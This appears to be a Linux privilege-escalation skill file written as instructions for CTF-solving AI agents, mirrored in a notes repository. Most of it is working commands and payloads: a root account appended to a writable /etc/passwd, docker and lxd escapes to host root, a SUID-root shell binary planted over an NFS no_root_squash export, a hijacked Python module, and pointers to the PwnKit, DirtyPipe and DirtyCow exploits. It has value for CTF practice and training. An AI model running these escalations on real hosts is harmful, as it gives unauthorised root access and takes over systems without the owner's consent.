# Kernel Exploits & Miscellaneous Privesc

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/host-linux/kernel-and-misc-privesc.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/host-linux/kernel-and-misc-privesc.md)

---

---
name: kernel-and-misc-privesc
category: host-linux
triggers: ["uname -a", "old kernel", "DirtyCow", "DirtyPipe", "PwnKit", "pkexec", "docker group", "lxd group", "NFS no_root_squash", "writable /etc/passwd", "python library hijack", "kernel exploit"]
tools: ["uname", "searchsploit", "gcc", "docker", "lxc", "openssl", "getcap"]
priority: high
description: Kernel-version-to-exploit mapping plus high-value misconfigs — pkexec, docker/lxd groups, NFS no_root_squash, writable /etc/passwd, library hijacking.
---
# Kernel Exploits & Miscellaneous Privesc

## Trigger context
Enumeration surfaced an old kernel/distro, a vulnerable setuid helper (pkexec/polkit), membership in a dangerous group (docker/lxd/disk), an NFS export with `no_root_squash`, a writable `/etc/passwd`, or a root-run Python/program that imports a module from a writable path. These are the "everything else" escalation routes when sudo/SUID/caps/cron come up empty.

## Objective
Escalate to root using either a kernel/userspace CVE matched to the running versions, or a specific host misconfiguration.

## Methodology (decision tree)
1. Record versions: `uname -a`, `cat /etc/os-release`, `sudo --version`, `pkexec --version`, `dpkg -l | grep -iE 'libc|polkit|sudo'`.
2. Prefer MISCONFIGS over kernel exploits (kernel exploits can panic the box). Check in this order: writable /etc/passwd, dangerous group membership, NFS no_root_squash, library hijack, then pkexec/polkit, then kernel LPE.
3. Match versions to known CVEs (table below). Confirm the box isn't patched (distro backports) before firing.
4. Compile on-target when possible (arch/libc must match); test in a non-panic way first.

## Commands & payloads
```bash
# --- Version recon ---
uname -a; cat /etc/os-release; pkexec --version; sudo --version | head -1
searchsploit linux kernel $(uname -r | cut -d- -f1)     # offline exploit DB match

# --- Writable /etc/passwd: add a root user ---
ls -la /etc/passwd                                       # must be writable by you
openssl passwd -1 -salt xx pass123                        # -> $1$xx$....  hash
echo 'r00t:$1$xx$HASHHERE:0:0:root:/root:/bin/bash' >> /etc/passwd
su r00t     # password: pass123  -> uid=0
# If passwd is readable but has an empty 2nd field for root and no shadow: even easier.

# --- Docker group: mount host / as root inside a container ---
id | grep -q docker && docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# then you are root on the host filesystem (edit /mnt/etc/passwd or read /root).

# --- LXD/LXC group: privileged container mounting host / ---
# (build/import a minimal alpine image, then:)
lxc init myimg r00t -c security.privileged=true
lxc config device add r00t disk source=/ path=/mnt/root recursive=true
lxc start r00t; lxc exec r00t /bin/sh    # /mnt/root is host / as root

# --- NFS no_root_squash: create a SUID-root binary from the client ---
showmount -e TARGET_IP                                    # find exports; look for no_root_squash
mount -t nfs TARGET_IP:/export /mnt/nfs                    # mount as ROOT on your attacker box
cat > /mnt/nfs/rootbash.c <<'EOF'
#include <unistd.h>
int main(){ setuid(0); setgid(0); execl("/bin/bash","bash","-p",0); }
EOF
gcc /mnt/nfs/rootbash.c -o /mnt/nfs/rootbash && chmod +s /mnt/nfs/rootbash   # owned root, SUID
# back on the target (low-priv), the file is SUID-root:
/export/rootbash -p

# --- Python / library hijack: root runs a script that imports a module from a writable dir ---
python3 -c 'import sys; print(sys.path)'                  # find a writable, earlier-in-path dir
# drop a malicious module named like the imported one:
echo 'import os; os.setuid(0); os.system("cp /bin/bash /tmp/rb; chmod +s /tmp/rb")' > /writable/os_helper.py
# also: writable .pth files, PYTHONPATH env kept via sudo, or writable site-packages.

# --- PwnKit  CVE-2021-4034 (pkexec, polkit) — no args needed, very reliable ---
# git clone https://github.com/ly4k/PwnKit ; ./PwnKit    (or berdav/CVE-2021-4034: make; ./cve-2021-4034)
pkexec --version                                          # <=0.120 typically vulnerable

# --- DirtyPipe  CVE-2022-0847 (kernel 5.8 – 5.16.11/5.15.25/5.10.102) ---
# overwrite a read-only file (e.g. /etc/passwd) or hijack a SUID binary's page cache.
# exploit-db 50808 / AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

# --- DirtyCow  CVE-2016-5195 (kernel < 4.8.3 roughly) ---
# firefart variant overwrites /etc/passwd:  gcc -pthread dirty.c -o dirty -lcrypt ; ./dirty
```

## Branching logic
- `/etc/passwd` writable -> do this first; it's instant, reliable, no compiling.
- In `docker`/`lxd`/`lxc` group -> container-escape to host root (no kernel exploit risk).
- In `disk` group -> read/write raw device: `debugfs /dev/sdaX` to read /root or edit /etc/shadow.
- NFS export with `no_root_squash` and you have root on the CLIENT side -> plant a SUID binary.
- Root cron/service runs a Python/Node/Ruby script importing from a writable dir or with `PYTHONPATH` preserved -> library hijack (chains with cron-path-hijack).
- pkexec present and polkit unpatched -> PwnKit (self-contained, no network, works across many distros).
- Only an old KERNEL left -> match CVE precisely (DirtyPipe/DirtyCow/OverlayFS CVE-2023-2640 & CVE-2023-32629 on Ubuntu, Looney Tunables CVE-2023-4911 glibc). Treat as last resort due to panic risk.

## Common pitfalls
- Kernel exploits can crash the target — snapshot/note before firing, and avoid on shared/production-like boxes; prefer misconfigs.
- Version string vs patch level: Ubuntu/RHEL backport fixes, so a "vulnerable" `uname` may be patched. Check the package changelog / use a PoC that self-checks.
- Wrong compiler flags/arch: match `file /bin/ls`, use `-static` if target libc differs, compile on-target when you can.
- Writable /etc/passwd hash format: the second field must be a valid crypt hash (use `openssl passwd -1` or `-6`); a malformed field locks the account.
- Docker/lxd escapes need the daemon actually running and reachable (`docker ps`, `lxc list`); group membership alone isn't enough if the socket is gone.
- NFS trick requires ROOT on the mounting client — you make the SUID file there; the target only executes it.
- Python hijack: your malicious module must appear EARLIER in `sys.path` than the real one, and the script must run as root.

## Proof / verification
- `id` -> `uid=0(root)`, or `/tmp/rb -p` gives an euid-0 shell; `cat /root/root.txt`.
- For container escapes, confirm you're reading the HOST `/root`, not the container's.
- For kernel PoCs, only claim success on an actual root shell — a crash/hang is failure, not proof.

## Cross-references
- [sa--instructions--host-linux--linux-enum-linpeas.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--linux-enum-linpeas.md) — version recon and group/mount enumeration.
- [sa--instructions--host-linux--capabilities.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--capabilities.md) — writable /etc/passwd via cap_dac_override; container caps.
- [sa--instructions--host-linux--cron-path-hijack.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--cron-path-hijack.md) — library hijack chains with root-run scheduled scripts.
- [sa--instructions--host-linux--sudo-gtfobins.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--sudo-gtfobins.md) — sudo/pkexec CVEs and env-preservation.

## Credible sources
- HackTricks Linux privesc (kernel, groups, NFS): https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- HackTricks interesting groups (docker/lxd/disk): https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html
- PwnKit CVE-2021-4034 (Qualys): https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
- DirtyPipe CVE-2022-0847: https://dirtypipe.cm4all.com/
- DirtyCow CVE-2016-5195: https://dirtycow.ninja/
- NFS no_root_squash: https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html
